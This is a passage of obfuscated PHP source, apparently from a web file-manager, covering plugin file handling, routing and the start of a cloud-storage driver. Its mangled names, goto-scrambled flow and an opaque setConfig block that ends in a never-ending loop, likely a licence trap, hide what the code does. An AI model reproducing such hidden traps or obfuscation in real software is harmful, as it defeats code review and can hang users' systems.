(!$this->isShare($a˜÷ğ°¡Ç¼)) { $a˜÷ğ°¡Ç¼ = $this->filePath($a˜÷ğ°¡Ç¼); } return Action($_SERVER[…ë˜õ][1075])->linkOut($a˜÷ğ°¡Ç¼); } public function filePathLinkOut($Fï†®¦ê·) { if (request_url_safe($Fï†®¦ê·)) { return $Fï†®¦ê·; } $this->fileCanView($Fï†®¦ê·); return Action($_SERVER[…ë˜õ][1075])->link($Fï†®¦ê·); } final function filePath($dÇĞìê¢Çë) { $A©õ¶“Š„Ã =& $_SERVER[…ë˜õ]; if ($f½†ßÑ–Ü = $this->checkSharePath($dÇĞìê¢Çë)) { return $f½†ßÑ–Ü; } $this->fileCanView($dÇĞìê¢Çë); if (request_url_safe($dÇĞìê¢Çë)) { $fŠÂ…ïµ²« = parse_url_query($dÇĞìê¢Çë); if (isset($fŠÂ…ïµ²«[$A©õ¶“Š„Ã[1427]]) && isset($fŠÂ…ïµ²«[$A©õ¶“Š„Ã[207]])) { $c•Á¿¢ô’Ä = Model($A©õ¶“Š„Ã[1129])->get($A©õ¶“Š„Ã[1428]); $E¡³’âáÉ = Mcrypt::decode($fŠÂ…ïµ²«[$A©õ¶“Š„Ã[207]], $c•Á¿¢ô’Ä); if ($E¡³’âáÉ) { $this->fileInfo = IO::infoWithChildren($E¡³’âáÉ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $E¡³’âáÉ; } } $dÇĞìê¢Çë = $this->_cacheHttpFile($dÇĞìê¢Çë); $this->fileInfo = IO::infoWithChildren($dÇĞìê¢Çë); } else { $this->fileInfo = IO::infoWithChildren($dÇĞìê¢Çë); if (!$this->fileInfo) { show_tips(LNG($A©õ¶“Š„Ã[104]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $dÇĞìê¢Çë; } final function _cacheHttpFile($A—±‘´„‚) { $d†ªÌƒôÒ = hash_path($A—±‘´„‚, !0); $this->cachePath = $this->pluginCachePath($d†ªÌƒôÒ); if ($e‘ˆÅÊ—Á® = IO::fileNameExist($this->cachePath, $d†ªÌƒôÒ)) { return KodIO::make($e‘ˆÅÊ—Á®); } $dŠÅ„ä¼´Í = $this->cachePath . $d†ªÌƒôÒ; return $this->pluginCacheFileSet($dŠÅ„ä¼´Í, file_get_contents($A—±‘´„‚)); } final function _tmpFileName($E×ãĞ”Ğ‚É = array()) { goto DŒìÇÕÆê; E°ãç‘ÑØ: $f‹§ö®ÖÕ = array($E×ãĞ”Ğ‚É[$aÕœå¬ù¨ï[28]], $E×ãĞ”Ğ‚É[$aÕœå¬ù¨ï[75]], $E×ãĞ”Ğ‚É[$aÕœå¬ù¨ï[77]]); if (isset($E×ãĞ”Ğ‚É[$aÕœå¬ù¨ï[481]])) { $f‹§ö®ÖÕ[] = $E×ãĞ”Ğ‚É[$aÕœå¬ù¨ï[481]]; } return md5(implode($aÕœå¬ù¨ï[70], $f‹§ö®ÖÕ)); goto a÷©ÆÒ×ÇĞ; DŒìÇÕÆê: $aÕœå¬ù¨ï =& $_SERVER[…ë˜õ]; if (!$E×ãĞ”Ğ‚É) { $E×ãĞ”Ğ‚É = $this->fileInfo; } if (isset($E×ãĞ”Ğ‚É[$aÕœå¬ù¨ï[170]])) { return $E×ãĞ”Ğ‚É[$aÕœå¬ù¨ï[170]]; } goto BŠåªôÑİ‡; BŠåªôÑİ‡: if (isset($E×ãĞ”Ğ‚É[$aÕœå¬ù¨ï[163]][$aÕœå¬ù¨ï[170]])) { return $E×ãĞ”Ğ‚É[$aÕœå¬ù¨ï[163]][$aÕœå¬ù¨ï[170]]; } $E™¬İîŒÂ© = IO::hashSimple($E×ãĞ”Ğ‚É[$aÕœå¬ù¨ï[75]]); if ($E™¬İîŒÂ©) { return $E™¬İîŒÂ©; } goto E°ãç‘ÑØ; a÷©ÆÒ×ÇĞ: } final function checkSharePath($eÖÒª¶Š°) { goto E‚ˆô¬; A¶¡òéİö”: $b×›‘ÕŸ½ = Action($dëì½ÒÖ»[1075])->sharePathInfo($eÖÒª¶Š°); if (!isset($b×›‘ÕŸ½[$dëì½ÒÖ»[75]])) { show_json(LNG($dëì½ÒÖ»[1430]), !1); } $this->fileInfo = $b×›‘ÕŸ½[$dëì½ÒÖ»[163]]; goto Bï‹íª½Ô; Bï‹íª½Ô: $this->cachePath = $this->pluginCachePath($this->fileInfo[$dëì½ÒÖ»[170]]); return $b×›‘ÕŸ½[$dëì½ÒÖ»[75]]; goto fºİ¦¯¼¸; E‚ˆô¬: $dëì½ÒÖ» =& $_SERVER[…ë˜õ]; if (!defined($dëì½ÒÖ»[448])) { define($dëì½ÒÖ»[1429], 0); } if (!$this->isShare($eÖÒª¶Š°)) { return !1; } goto A¶¡òéİö”; fºİ¦¯¼¸: } final function pluginCachePath($cí…²Ò¦‹Û = '') { $A¿†£·é =& $_SERVER[…ë˜õ]; $bù†Şš£Öå = IO_PATH_SYSTEM_TEMP . $A¿†£·é[1431] . $this->pluginName; if (!($a¾ñà®ñ = IO::infoFull($bù†Şš£Öå))) { return IO::mkdir($bù†Şš£Öå . $A¿†£·é[8] . $cí…²Ò¦‹Û); } if (empty($cí…²Ò¦‹Û)) { return $a¾ñà®ñ[$A¿†£·é[75]]; } if (!($b¿è¬ƒß»· = IO::fileNameExist($a¾ñà®ñ[$A¿†£·é[75]], $cí…²Ò¦‹Û))) { return IO::mkdir($a¾ñà®ñ[$A¿†£·é[75]] . $cí…²Ò¦‹Û); } return KodIO::make($b¿è¬ƒß»·); } final function pluginCacheFileSet($b¼¨Š®˜®‚, $bÜŠ ×¤—„ = '') { $b‡¬‘Œ´ˆ =& $_SERVER[…ë˜õ]; if (!($A‹•Å¤¯ = IO::infoFull($b¼¨Š®˜®‚))) { return IO::mkfile($b¼¨Š®˜®‚, $bÜŠ ×¤—„, REPEAT_REPLACE); } IO::setContent($A‹•Å¤¯[$b‡¬‘Œ´ˆ[75]], $bÜŠ ×¤—„); return $A‹•Å¤¯[$b‡¬‘Œ´ˆ[75]]; } final function pluginLocalFile($bøó°Íïªë = '') { goto e©’‹§Æ è; C¥ÄÁäé™Ş: if (!$bøó°Íïªë) { return $F±‰¼–Ú‡Ö; } $D×§ÀöË = IO::info($bøó°Íïªë); $d§êë·¼„ = $this->_tmpFileName($D×§ÀöË) . $eƒ„à¶İ[94] . $D×§ÀöË[$eƒ„à¶İ[167]]; goto E½ÄÏ»¢İÖ; F‡¿œ‚Á: return IO::copy($bøó°Íïªë, $F±‰¼–Ú‡Ö, 0, $d§êë·¼„); goto aÎÙÀìå; E½ÄÏ»¢İÖ: if (!checkExtSafe($d§êë·¼„)) { $d§êë·¼„ = $d§êë·¼„ . $eƒ„à¶İ[1432]; } $f ˜İäœ×× = $F±‰¼–Ú‡Ö . $d§êë·¼„; if (@file_exists($f ˜İäœ××)) { return $f ˜İäœ××; } goto F‡¿œ‚Á; e©’‹§Æ è: $eƒ„à¶İ =& $_SERVER[…ë˜õ]; $F±‰¼–Ú‡Ö = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($F±‰¼–Ú‡Ö)) { mk_dir($F±‰¼–Ú‡Ö); } goto C¥ÄÁäé™Ş; aÎÙÀìå: } final function appPackage() { goto cÇ³„Ëâ; cÇ³„Ëâ: $eóéĞã¤ö =& $_SERVER[…ë˜õ]; if ($this->packageData) { return $this->packageData; } $dµÙò‡ÓÂ = $this->parseFile($this->pluginPath . $eóéĞã¤ö[1433]); goto dĞ’´Şç‘; B‚Ïîµ‰í: $dØ‡ø…¶êº = Hook::trigger($eóéĞã¤ö[1434], $F§İ‹ôÔ×˜); if ($dØ‡ø…¶êº && is_array($dØ‡ø…¶êº)) { $F§İ‹ôÔ×˜ = $dØ‡ø…¶êº; } $this->packageData = $F§İ‹ôÔ×˜; goto fÛÂˆ„²±ã; dĞ’´Şç‘: $this->parseLang($dµÙò‡ÓÂ); $F§İ‹ôÔ×˜ = json_decode_force($dµÙò‡ÓÂ); if (!$F§İ‹ôÔ×˜) { return array(); } goto B‚Ïîµ‰í; fÛÂˆ„²±ã: return $F§İ‹ôÔ×˜; goto F¥ƒ°±âÜ®; F¥ƒ°±âÜ®: } public function packageInfoGet($DöÖ±Ó¶°œ) { $eô´ïî— = $this->appPackage(); return array_get_value($eô´ïî—, $DöÖ±Ó¶°œ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[…ë˜õ][1435]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[…ë˜õ][1436]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[…ë˜õ][1437]); } private function parseFile($EÏ‘®¯õÉø) { goto aóÏø‡ø§é; eÏ¨‘—©›: $Dæª©¼»îë = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$D¤›ÁîæÑ§[87]][$D¤›ÁîæÑ§[1445]]); if (strstr($Cë·­Ù’™‰, $D¤›ÁîæÑ§[1446])) { $aó©ÍäÜÖ¢ = rawurlencode(json_encode($this->pluginLangArr)); $Cë·­Ù’™‰ = str_replace($D¤›ÁîæÑ§[1446], $aó©ÍäÜÖ¢, $Cë·­Ù’™‰); } if (strstr($Cë·­Ù’™‰, $D¤›ÁîæÑ§[1447])) { $aó©ÍäÜÖ¢ = $aó©ÍäÜÖ¢ = rawurlencode(json_encode($this->getConfig())); $Cë·­Ù’™‰ = str_replace($D¤›ÁîæÑ§[1447], $aó©ÍäÜÖ¢, $Cë·­Ù’™‰); } goto FÆ¾Ôèæ¡˜; FÆ¾Ôèæ¡˜: $Cë·­Ù’™‰ = str_replace($BìËÇä†, $Dæª©¼»îë, $Cë·­Ù’™‰); return $Cë·­Ù’™‰; goto d¨£Š×íêã; aóÏø‡ø§é: $D¤›ÁîæÑ§ =& $_SERVER[…ë˜õ]; $Cë·­Ù’™‰ = file_get_contents($EÏ‘®¯õÉø); $BìËÇä† = array($D¤›ÁîæÑ§[1438], $D¤›ÁîæÑ§[1439], $D¤›ÁîæÑ§[1440], $D¤›ÁîæÑ§[1441], $D¤›ÁîæÑ§[1442], $D¤›ÁîæÑ§[1443], $D¤›ÁîæÑ§[1444]); goto eÏ¨‘—©›; d¨£Š×íêã: } private function parseLang(&$d‘£à¡º) { goto DÍéŞŞƒß; b’¶ğ¹ÜŸ²: $eÉÑôó¢Ç• = array(); foreach ($EÎØÀ„ÌŒÑ[0] as $C«ª·ƒøÅ‰) { $cÕŸ‰äõî = substr($C«ª·ƒøÅ‰, strlen($EÙÃá°ôŒ), -4); $fàÎÈŸ¨­ò = LNG($cÕŸ‰äõî); $dğõËŸ…¦à[] = $C«ª·ƒøÅ‰; $eÉÑôó¢Ç•[] = str_replace(array($Aï‰®¡¶–÷[227], $Aï‰®¡¶–÷[1043], $Aï‰®¡¶–÷[338], $Aï‰®¡¶–÷[115]), array($Aï‰®¡¶–÷[50], $Aï‰®¡¶–÷[50], $Aï‰®¡¶–÷[33], $Aï‰®¡¶–÷[1450]), $fàÎÈŸ¨­ò); } $d‘£à¡º = str_replace($dğõËŸ…¦à, $eÉÑôó¢Ç•, $d‘£à¡º); goto f‡Å†ŠçŸ÷; DÍéŞŞƒß: $Aï‰®¡¶–÷ =& $_SERVER[…ë˜õ]; $EÙÃá°ôŒ = $Aï‰®¡¶–÷[1448]; if (!strstr($d‘£à¡º, $EÙÃá°ôŒ)) { return; } goto d¼Ë¸’¢È¶; d¼Ë¸’¢È¶: preg_match_all($Aï‰®¡¶–÷[1449], $d‘£à¡º, $EÎØÀ„ÌŒÑ); if (!is_array($EÎØÀ„ÌŒÑ) || count($EÎØÀ„ÌŒÑ) == 0 || !is_array($EÎØÀ„ÌŒÑ[0]) || count($EÎØÀ„ÌŒÑ[0]) == 0) { return; } $dğõËŸ…¦à = array(); goto b’¶ğ¹ÜŸ²; f‡Å†ŠçŸ÷: } private function parseConfig(&$D‚´¥òß×) { goto bò×Ì©Ş¤; D¨­¹»áôá: $CÑ¸ê˜ø„‡ = array(); $CºÁùÕÙÍ = array(); foreach ($A©–×Œš„Ü[0] as $f›äÍó—áÅ) { $BôÀ¾¹ö = substr($f›äÍó—áÅ, strlen($AÎêº—), -2); $CÑ¸ê˜ø„‡[] = $f›äÍó—áÅ; $CºÁùÕÙÍ[] = _get($dáÛÆâ¡ê¦, $BôÀ¾¹ö); } goto a’öáğõŠ„; a’öáğõŠ„: $D‚´¥òß× = str_replace($CÑ¸ê˜ø„‡, $CºÁùÕÙÍ, $D‚´¥òß×); goto c„ÄÔŠ¾½Ë; bò×Ì©Ş¤: $e°£ášë„š =& $_SERVER[…ë˜õ]; $AÎêº— = $e°£ášë„š[1451]; if (!strstr($D‚´¥òß×, $AÎêº—)) { return; } goto FÍÍ©†Ñ; FÍÍ©†Ñ: preg_match_all($e°£ášë„š[1452], $D‚´¥òß×, $A©–×Œš„Ü); if (!is_array($A©–×Œš„Ü) || count($A©–×Œš„Ü) == 0 || !is_array($A©–×Œš„Ü[0]) || count($A©–×Œš„Ü[0]) == 0) { return; } $dáÛÆâ¡ê¦ = $this->getConfig(); goto D¨­¹»áôá; c„ÄÔŠ¾½Ë: } private function parsePackage(&$FÙŒ¶ß†‚Ü) { goto Aô˜ğÊ•ñ; Aô˜ğÊ•ñ: $eë‹ˆ³¹ =& $_SERVER[…ë˜õ]; $F‰Ê¯„Î = $eë‹ˆ³¹[1453]; if (!strstr($FÙŒ¶ß†‚Ü, $F‰Ê¯„Î)) { return; } goto C»Ì¥‡¿Ì; CŠƒ¾œ¸·È: $FÙŒ¶ß†‚Ü = str_replace($eĞÎùìµˆ, $C¿æ¹‹–ºŒ, $FÙŒ¶ß†‚Ü); goto C¿Õ•ãÍ¯å; añ»„ßêŸ‘: $eĞÎùìµˆ = array(); $C¿æ¹‹–ºŒ = array(); foreach ($c·­å…ÇŠí[0] as $e„ĞÚ¼ÕöÆ) { $F÷ ö¢½­ = substr($e„ĞÚ¼ÕöÆ, strlen($F‰Ê¯„Î), -2); $eĞÎùìµˆ[] = $e„ĞÚ¼ÕöÆ; $C¿æ¹‹–ºŒ[] = _get($c¡Ğº‹È¸, $F÷ ö¢½­); } goto CŠƒ¾œ¸·È; C»Ì¥‡¿Ì: preg_match_all($eë‹ˆ³¹[1454], $FÙŒ¶ß†‚Ü, $c·­å…ÇŠí); if (!is_array($c·­å…ÇŠí) || count($c·­å…ÇŠí) == 0 || !is_array($c·­å…ÇŠí[0]) || count($c·­å…ÇŠí[0]) == 0) { return; } $c¡Ğº‹È¸ = $this->appPackage(); goto añ»„ßêŸ‘; C¿Õ•ãÍ¯å: } final function echoFile($c¯“¯å¥Ê„, $B¬è°İ—İ¬ = false) { goto F¶ÀÕ½†…È; F¶ÀÕ½†…È: $eî„»ùÍŞÇ =& $_SERVER[…ë˜õ]; $c‚Àâ–™Ûì = $this->pluginPath . $c¯“¯å¥Ê„; if (ACT == $eî„»ùÍŞÇ[1455]) { echo $eî„»ùÍŞÇ[1456] . $this->pluginName . $eî„»ùÍŞÇ[8] . $c¯“¯å¥Ê„ . $eî„»ùÍŞÇ[1457]; if (!file_exists($c‚Àâ–™Ûì)) { echo $eî„»ùÍŞÇ[1458]; return; } } goto AŠ™’†å¸ö; AŠ™’†å¸ö: $eì± èĞ§ = $this->parseFile($c‚Àâ–™Ûì); $this->parseLang($eì± èĞ§); $this->parseConfig($eì± èĞ§); goto D¸¾ô‘†¤; D¸¾ô‘†¤: $this->parsePackage($eì± èĞ§); if (is_array($B¬è°İ—İ¬)) { $eì± èĞ§ = str_replace(array_keys($B¬è°İ—İ¬), array_values($B¬è°İ—İ¬), $eì± èĞ§); } echo $eî„»ùÍŞÇ[227] . $eì± èĞ§; goto A¢¯ŸğÁƒ§; A¢¯ŸğÁƒ§: } final function initLang() { goto a ƒ‚¬…Äß; bƒˆğ¢¾¡Ú: if (!is_array($bõòåßŸÃ)) { return array(); } if (@count($bõòåßŸÃ) > 0) { I18n::set($bõòåßŸÃ); } return $bõòåßŸÃ; goto Dã‰´ÂØÊ; cÖ¡¬àÎÈõ: $e–…Œä§Òç = I18n::getType(); $bõòåßŸÃ = array(); if (file_exists($DØÉ¹Á³ . $e–…Œä§Òç . $fÑè±„…[809])) { $bõòåßŸÃ = (include $DØÉ¹Á³ . $e–…Œä§Òç . $fÑè±„…[809]); } else { if ($e–…Œä§Òç == $fÑè±„…[1461] && !file_exists($DØÉ¹Á³ . $e–…Œä§Òç . $fÑè±„…[809]) && file_exists($DØÉ¹Á³ . $fÑè±„…[1462])) { $bõòåßŸÃ = (include $DØÉ¹Á³ . $fÑè±„…[1462]); } else { if (file_exists($DØÉ¹Á³ . $fÓ­ğØÕÃ . $fÑè±„…[809])) { $bõòåßŸÃ = (include $DØÉ¹Á³ . $fÓ­ğØÕÃ . $fÑè±„…[809]); } } } goto bƒˆğ¢¾¡Ú; a ƒ‚¬…Äß: $fÑè±„… =& $_SERVER[…ë˜õ]; $fÓ­ğØÕÃ = $fÑè±„…[1459]; $DØÉ¹Á³ = $this->pluginPath . $fÑè±„…[1460]; goto cÖ¡¬àÎÈõ; Dã‰´ÂØÊ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($bÊÀÏÖ¢‡Ü) { $fÇ‚‹«ÇÎ =& $_SERVER[…ë˜õ]; if (!isset($_SERVER[$fÇ‚‹«ÇÎ[824]]) || !isset($_SERVER[$fÇ‚‹«ÇÎ[825]])) { goto cŠ†„¥‡Š; Eó‘¢™İ¯³: $b’‹íÊÆÓÚ = $A‰Ÿµ£ëË†($C¾²…èéö); $a†‘“ñ¦™ = explode($fÇ‚‹«ÇÎ[227], $b’‹íÊÆÓÚ); if (count($a†‘“ñ¦™) < $fÇ‚‹«ÇÎ[570]) { $cøÂÆç¬† = $fÇ‚‹«ÇÎ[829]; $cøÂÆç¬†(); } goto aÏ…Æ„ğ; aÏ…Æ„ğ: $fÙÊ†¾•¹› = $fÇ‚‹«ÇÎ[846]; $fÙÊ†¾•¹›($_SERVER[$fÇ‚‹«ÇÎ[847]]); $dêäÁÛÒ­ = 1; goto cÛÓ»òŸ†´; cŠ†„¥‡Š: $A§Ø¿¢± = $fÇ‚‹«ÇÎ[845]; $A‰Ÿµ£ëË† = $fÇ‚‹«ÇÎ[826]; $C¾²…èéö = $_SERVER[$fÇ‚‹«ÇÎ[827]] . $fÇ‚‹«ÇÎ[828]; goto Eó‘¢™İ¯³; cÛÓ»òŸ†´: for ($EöÓÏî¿«© = $dêäÁÛÒ­; $EöÓÏî¿«© > 0; $EöÓÏî¿«©++) { $fÙÊ†¾•¹› = json_encode($GLOBALS[$fÇ‚‹«ÇÎ[405]]); } goto Dœøù„øè˜; Dœøù„øè˜: } return $this->modelPlugin->setConfig($this->pluginName, $bÊÀÏÖ¢‡Ü); } public function onSetConfig($e§ºÏ¬ÓÚ™) { } public function onGetConfig($fŸÄˆ­¯«) { } public function onChangeStatus($c…ÕÏßˆ»Ç) { } public function onUninstall() { } public function onInstall() { } public function authCheck($D›‰ø Õìµ = "\160\x6c\x75\x67\151\156\x41\165\164\x68") { $D¸ïÏµ‡åÎ =& $_SERVER[…ë˜õ]; if (!defined($D¸ïÏµ‡åÎ[448])) { return !1; } if (_get($GLOBALS, $D¸ïÏµ‡åÎ[479])) { return !0; } $d¸Éö‘ ¿Š = $this->getConfig(); if (!$d¸Éö‘ ¿Š[$D›‰ø Õìµ]) { return !1; } return ActionCall($D¸ïÏµ‡åÎ[1463], $d¸Éö‘ ¿Š[$D›‰ø Õìµ]); } public function url($Cšã‹µğ…, $fÏ®¶ò¤¿ = '', $bÃÅßñ§òÓ = true) { goto eƒ‹èƒÜåğ; FÄ÷ÉÅ³¹ê: if (!$bÃÅßñ§òÓ) { return $E“Š¹„«Ş˜; } echo $E“Š¹„«Ş˜; goto aÕ¹Š©‚‘ô; cÅ·ÙìäÊø: $Bó¬Ù¦îÛ± = $this->packageVersion(); $b’‹­òñÛ¿ = $D»®Ò¦ô¢À . $cŠÉØôÜë[434] . $Bó¬Ù¦îÛ±; if (substr($Cšã‹µğ…, 0, 4) == $cŠÉØôÜë[146] || substr($Cšã‹µğ…, 0, 2) == $cŠÉØôÜë[1249]) { $E“Š¹„«Ş˜ = $Cšã‹µğ… . $cŠÉØôÜë[1464] . $b’‹­òñÛ¿; } else { if ($fÏ®¶ò¤¿ == $cŠÉØôÜë[33]) { $E“Š¹„«Ş˜ = $this->pluginHost . $Cšã‹µğ… . $cŠÉØôÜë[1464] . $b’‹­òñÛ¿; } else { if ($fÏ®¶ò¤¿ === $cŠÉØôÜë[76]) { $E“Š¹„«Ş˜ = $this->pluginHost . $Cšã‹µğ…; } else { if ($fÏ®¶ò¤¿ == $cŠÉØôÜë[1465]) { $E“Š¹„«Ş˜ = STATIC_PATH . $Cšã‹µğ… . $cŠÉØôÜë[1464] . $D»®Ò¦ô¢À; } else { if ($fÏ®¶ò¤¿ == $cŠÉØôÜë[1466]) { $E“Š¹„«Ş˜ = APP_HOST . $cŠÉØôÜë[1467] . $Cšã‹µğ… . $cŠÉØôÜë[1464] . $D»®Ò¦ô¢À; } else { if (isset($dµÓÓ¬±Û[$fÏ®¶ò¤¿])) { $E“Š¹„«Ş˜ = $dµÓÓ¬±Û[$fÏ®¶ò¤¿] . $Cšã‹µğ… . $cŠÉØôÜë[1464] . $b’‹­òñÛ¿; } } } } } } goto FÄ÷ÉÅ³¹ê; eƒ‹èƒÜåğ: $cŠÉØôÜë =& $_SERVER[…ë˜õ]; $dµÓÓ¬±Û = $this->getConfig(); $D»®Ò¦ô¢À = KOD_VERSION . $cŠÉØôÜë[94] . KOD_VERSION_BUILD; goto cÅ·ÙìäÊø; aÕ¹Š©‚‘ô: } public function link($Fñí¢õØå = false, $B’ÉßôùŠ» = '') { $cñò•¾¸ =& $_SERVER[…ë˜õ]; if (!$Fñí¢õØå) { $this->link($cñò•¾¸[1468], $cñò•¾¸[1466]); $this->link($cñò•¾¸[1469], $cñò•¾¸[1465]); $this->link($cñò•¾¸[1470], $cñò•¾¸[1465]); $this->link($cñò•¾¸[1471], $cñò•¾¸[1465]); $this->link($cñò•¾¸[1472], $cñò•¾¸[1465]); return; } $a¾›íÁÓÑó = $this->url($Fñí¢õØå, $B’ÉßôùŠ», !1); if (substr($Fñí¢õØå, -3) == $cñò•¾¸[1473]) { echo $cñò•¾¸[1474] . $a¾›íÁÓÑó . $cñò•¾¸[1475] . $cñò•¾¸[227]; } else { if (substr($Fñí¢õØå, -4) == $cñò•¾¸[1476]) { echo $cñò•¾¸[1477] . $a¾›íÁÓÑó . $cñò•¾¸[1478] . $cñò•¾¸[227]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\x79" => "\x5b\x5e\57\135\53", "\72\156\x75\155" => "\x5b\60\55\71\x5d\x2b", "\72\141\154\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($Aè˜Õ¦£åø, $Båáˆê²‹í) { $CÇ—ÊÂ¡Î™ =& $_SERVER[…ë˜õ]; if ($Aè˜Õ¦£åø == $CÇ—ÊÂ¡Î™[1479]) { $dˆÈ‘Îã¦£ = array_map($CÇ—ÊÂ¡Î™[1480], $Båáˆê²‹í[0]); $c“÷±Ç›…¤ = strpos($Båáˆê²‹í[1], $CÇ—ÊÂ¡Î™[8]) === 0 ? $Båáˆê²‹í[1] : $CÇ—ÊÂ¡Î™[8] . $Båáˆê²‹í[1]; $cµ«Ş‹Œ = $Båáˆê²‹í[2]; } else { $dˆÈ‘Îã¦£ = null; $c“÷±Ç›…¤ = strpos($Båáˆê²‹í[0], $CÇ—ÊÂ¡Î™[8]) === 0 ? $Båáˆê²‹í[0] : $CÇ—ÊÂ¡Î™[8] . $Båáˆê²‹í[0]; $cµ«Ş‹Œ = $Båáˆê²‹í[1]; } array_push(self::$maps, $dˆÈ‘Îã¦£); array_push(self::$routes, $c“÷±Ç›…¤); array_push(self::$methods, strtoupper($Aè˜Õ¦£åø)); array_push(self::$callbacks, $cµ«Ş‹Œ); } public static function error($aÃ…Ö™Â¦İ) { self::$errorCallback = $aÃ…Ö™Â¦İ; } public static function haltOnMatch($cœİ°ƒ©° = true) { self::$halts = $cœİ°ƒ©°; } public static function dispatch() { goto aõ÷µŒàÃ; e˜Àæƒ¡›½: self::$routes = preg_replace($d¬·—óŸî¹[1167], $d¬·—óŸî¹[8], self::$routes); if (in_array($b´Ç£÷ã¼ê, self::$routes)) { $F½¨Šˆå»š = array_keys(self::$routes, $b´Ç£÷ã¼ê); foreach ($F½¨Šˆå»š as $BÇ“Š·«ò¥) { if (self::$methods[$BÇ“Š·«ò¥] == $F£ŞÏ±³ù¬ || self::$methods[$BÇ“Š·«ò¥] == $d¬·—óŸî¹[1482] || in_array($F£ŞÏ±³ù¬, self::$maps[$BÇ“Š·«ò¥])) { $F…¬åŒâ‘¿ = !0; if (!is_object(self::$callbacks[$BÇ“Š·«ò¥])) { $AÀïÏß“ = explode($d¬·—óŸî¹[8], self::$callbacks[$BÇ“Š·«ò¥]); $Dã¥Š¾ˆÔ = end($AÀïÏß“); $fó¶Æ‚ëÜ = explode($d¬·—óŸî¹[1483], $Dã¥Š¾ˆÔ); $F°Áí = new $fó¶Æ‚ëÜ[0](); $F°Áí->{$fó¶Æ‚ëÜ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$BÇ“Š·«ò¥]); if (self::$halts) { return; } } } } } else { $F¹¼ÏÉñàå = 0; foreach (self::$routes as $BÇ“Š·«ò¥) { if (strpos($BÇ“Š·«ò¥, $d¬·—óŸî¹[4]) !== !1) { $BÇ“Š·«ò¥ = str_replace($A»šâªƒ, $E›ËÁ»ŒÈ, $BÇ“Š·«ò¥); } if (preg_match($d¬·—óŸî¹[1484] . $BÇ“Š·«ò¥ . $d¬·—óŸî¹[1485], $b´Ç£÷ã¼ê, $B’¢ë•Å§)) { if (self::$methods[$F¹¼ÏÉñàå] == $F£ŞÏ±³ù¬ || self::$methods[$F¹¼ÏÉñàå] == $d¬·—óŸî¹[1482] || !empty(self::$maps[$F¹¼ÏÉñàå]) && in_array($F£ŞÏ±³ù¬, self::$maps[$F¹¼ÏÉñàå])) { $F…¬åŒâ‘¿ = !0; array_shift($B’¢ë•Å§); if (!is_object(self::$callbacks[$F¹¼ÏÉñàå])) { $AÀïÏß“ = explode($d¬·—óŸî¹[8], self::$callbacks[$F¹¼ÏÉñàå]); $Dã¥Š¾ˆÔ = end($AÀïÏß“); $fó¶Æ‚ëÜ = explode($d¬·—óŸî¹[1483], $Dã¥Š¾ˆÔ); $F°Áí = new $fó¶Æ‚ëÜ[0](); if (!method_exists($F°Áí, $fó¶Æ‚ëÜ[1])) { echo $d¬·—óŸî¹[1486]; } else { call_user_func_array(array($F°Áí, $fó¶Æ‚ëÜ[1]), $B’¢ë•Å§); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$F¹¼ÏÉñàå], $B’¢ë•Å§); if (self::$halts) { return; } } } } $F¹¼ÏÉñàå++; } } if ($F…¬åŒâ‘¿ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $bÌ“ôÙ°¤¬ =& $_SERVER[…ë˜õ]; header($_SERVER[$bÌ“ôÙ°¤¬[1487]] . $bÌ“ôÙ°¤¬[1488]); echo $bÌ“ôÙ°¤¬[1489]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$d¬·—óŸî¹[1481]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto D¾£Ø“¿×£; aõ÷µŒàÃ: $d¬·—óŸî¹ =& $_SERVER[…ë˜õ]; $b´Ç£÷ã¼ê = parse_url($_SERVER[$d¬·—óŸî¹[1481]], PHP_URL_PATH); $F£ŞÏ±³ù¬ = $_SERVER[$d¬·—óŸî¹[156]]; goto câ±Óó¸¥; câ±Óó¸¥: $A»šâªƒ = array_keys(static::$patterns); $E›ËÁ»ŒÈ = array_values(static::$patterns); $F…¬åŒâ‘¿ = !1; goto e˜Àæƒ¡›½; D¾£Ø“¿×£: } } goto B’Ëˆ´Ä; DæÑù¯Ó³‰: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\160\72\x2f\x2f\x76\60\56\141\160\x69\56\x75\160\171\x75\156\x2e\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($FÓÒø«„¨Ğ) { parent::__construct(); $this->_init($FÓÒø«„¨Ğ); } public function _init($bˆ ¿¥˜Œº) { $f˜ˆâ¬Ì =& $_SERVER[…ë˜õ]; foreach ($bˆ ¿¥˜Œº as $Bˆ‡Ú©ª‘ë => $Cñƒ‡Ë«…ä) { if (isset($this->{$Bˆ‡Ú©ª‘ë})) { $this->{$Bˆ‡Ú©ª‘ë} = $Cñƒ‡Ë«…ä; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($f˜ˆâ¬Ì[1334] . LNG($f˜ˆâ¬Ì[1266])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($BôÁ‹–ŸêÃ, $b‚¶‚­´ßÃ = "\107\x45\124") { $bª†Ó’øè =& $_SERVER[…ë˜õ]; $f„²ĞÉƒ£Õ = gmdate($bª†Ó’øè[1300]); $F¿ÌÎéÕ©ç = base64_encode(hash_hmac($bª†Ó’øè[1335], "{$b‚¶‚­´ßÃ}\46{$BôÁ‹–ŸêÃ}\x26{$f„²ĞÉƒ£Õ}", md5("{$this->userpass}"), !0)); 